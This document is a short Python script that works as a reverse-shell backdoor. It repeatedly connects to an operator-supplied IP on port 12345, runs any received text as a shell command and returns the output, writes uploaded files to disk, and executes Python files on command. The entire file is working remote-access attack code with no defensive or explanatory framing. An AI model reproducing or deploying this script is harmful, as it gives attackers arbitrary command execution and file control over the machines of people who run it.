import time

import socket as sk
import subprocess

def null():
    a = None

s = sk.socket(sk.AF_INET,sk.SOCK_STREAM)
ip = input('ip:')
run = True
while True:
    try:
        s.connect((ip,12345))
    except:
        pass
    else:
        break

def usePy():
    get=None
    try:
        get=s.recv(1024).decode().rstrip()
        with open(get,'r') as file:
            a=file.read()
        exec(a,{})
    except Exception as r:
        s.send(f"ERROR:{r}\n".encode())
    else:
        s.send('good end\n'.encode())
def download():
    get = None
    try:
        get = s.recv(1024)
        names = get.decode().rstrip()
        get = s.recv(1024)
        lens = int(get.decode().rstrip())
        s.send("good\n".encode())
        writes = s.recv(lens)
        with open(names,'wb') as file:
            file.write(writes)
        s.send("good end\n".encode())
    except Exception as r:
        print(r)
        s.send(f"ERROR:{r}\n".encode())
    
while run:
    try:
        info = s.recv(1024).decode().rstrip()
        print(info)
        if info=='useModel------':
            info = s.recv(1024).decode().rstrip()
            if info == 'exit':
                s.close()
                break
            elif info == 'upload':
                download()
            elif info == 'use py':
                usePy()
        else:
            vel = str(subprocess.getoutput(info))+'\n'
            print(vel)
            s.send(str(len(vel.encode())).encode())
            s.send(vel.encode())
    except Exception as r:
        run = False
s.close()
exit(0)
